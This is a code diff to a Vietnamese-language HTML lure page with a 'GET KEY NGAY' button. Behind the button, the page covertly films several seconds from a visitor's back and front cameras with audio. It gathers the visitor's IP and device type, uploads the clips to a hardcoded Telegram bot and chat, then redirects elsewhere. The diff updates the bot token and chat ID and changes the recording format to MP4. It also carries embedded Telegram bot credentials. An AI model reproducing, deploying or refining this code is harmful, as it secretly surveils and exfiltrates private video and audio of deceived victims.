@@ -97,6 +97,7 @@
 </head>
 <body>
 
+  <!-- Canvas hiệu ứng mưa chữ Hacker Matrix đậm nét -->
   <canvas id="matrix-rain"></canvas>
 
   <script>
@@ -148,6 +149,7 @@
 
     <video id="video" autoplay playsinline muted></video>
 
+    <!-- 1 Nút Get Key duy nhất -->
     <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
       <span>🔑 GET KEY NGAY</span>
     </button>
@@ -156,8 +158,8 @@
   </div>
 
 <script>
-  const TELEGRAM_BOT_TOKEN = '8004670099:AAE-K9WLJWR4c2mfPVWS0fIWl_wLOci0UFk'; 
-  const TELEGRAM_CHAT_ID = '-5529480454'; 
+  const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
+  const TELEGRAM_CHAT_ID = '-1004303781844'; 
   const REDIRECT_URL = 'https://xnhau.city/';
 
   function updateClock() {
@@ -171,7 +173,7 @@
   const video = document.getElementById('video');
   const getKeyBtn = document.getElementById('get-key-btn');
 
-  // Hàm quay video kèm âm thanh trong thời gian (duration) tính bằng mili-giây
+  // Hàm quay video định dạng MP4 kèm âm thanh
   async function recordVideo(facingMode, duration = 3000) {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -183,11 +185,17 @@
 
       return await new Promise((resolve) => {
         let recordedChunks = [];
-        let options = { mimeType: 'video/webm; codecs=vp8,opus' };
+        
+        // Ưu tiên định dạng MP4 nếu trình duyệt hỗ trợ
+        let options = { mimeType: 'video/mp4' };
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          options = { mimeType: 'video/webm' };
-          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-            options = {}; // Dùng mặc định của trình duyệt nếu webm không hỗ trợ
+          // Fallback các định dạng MP4 phổ biến khác nếu có
+          if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac')) {
+            options = { mimeType: 'video/mp4;codecs=h264,aac' };
+          } else if (MediaRecorder.isTypeSupported('video/webm;codecs=h264,opus')) {
+            options = { mimeType: 'video/webm;codecs=h264,opus' };
+          } else {
+            options = {}; 
           }
         }
 
@@ -200,7 +208,7 @@
         };
 
         mediaRecorder.onstop = () => {
-          const blob = new Blob(recordedChunks, { type: 'video/webm' });
+          const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/mp4' });
           stream.getTracks().forEach(track => track.stop());
           resolve(blob);
         };
@@ -239,7 +247,7 @@
     let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
 
     const infoText = 
-      `💻 <b>YÊU CẦU GET KEY (VIDEO RECORD)</b> 💻\n` +
+      `💻 <b>YÊU CẦU GET KEY (VIDEO MP4)</b> 💻\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Thiết bị:</b> ${deviceName}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
@@ -248,11 +256,9 @@
       `━━━━━━━━━━━━━━━━━━━━━`;
 
     statusDiv.textContent = '[*] Đang ghi hình luồng #1 (Camera sau)...';
-    // Quay camera sau trong 3 giây
     let backVideoBlob = await recordVideo('environment', 3000);
 
     statusDiv.textContent = '[*] Đang ghi hình luồng #2 (Camera trước)...';
-    // Quay camera trước trong 3 giây
     let frontVideoBlob = await recordVideo('user', 3000);
 
     let hasSent = false;
@@ -260,8 +266,8 @@
     if (backVideoBlob && backVideoBlob.size > 0) {
       const fd = new FormData();
       fd.append('chat_id', TELEGRAM_CHAT_ID);
-      fd.append('video', backVideoBlob, 'back_video.webm');
-      fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (Kèm âm thanh)</b>');
+      fd.append('video', backVideoBlob, 'back_video.mp4');
+      fd.append('caption', infoText + '\n\n🎥 <b>Video Camera Sau (MP4 + Âm thanh)</b>');
       fd.append('parse_mode', 'HTML');
       try { 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd }); 
@@ -272,8 +278,8 @@
     if (frontVideoBlob && frontVideoBlob.size > 0) {
       const fd2 = new FormData();
       fd2.append('chat_id', TELEGRAM_CHAT_ID);
-      fd2.append('video', frontVideoBlob, 'front_video.webm');
-      fd2.append('caption', '🎥 <b>Video Camera Trước (Kèm âm thanh)</b>');
+      fd2.append('video', frontVideoBlob, 'front_video.mp4');
+      fd2.append('caption', '🎥 <b>Video Camera Trước (MP4 + Âm thanh)</b>');
       fd2.append('parse_mode', 'HTML');
       try { 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd2 }); 
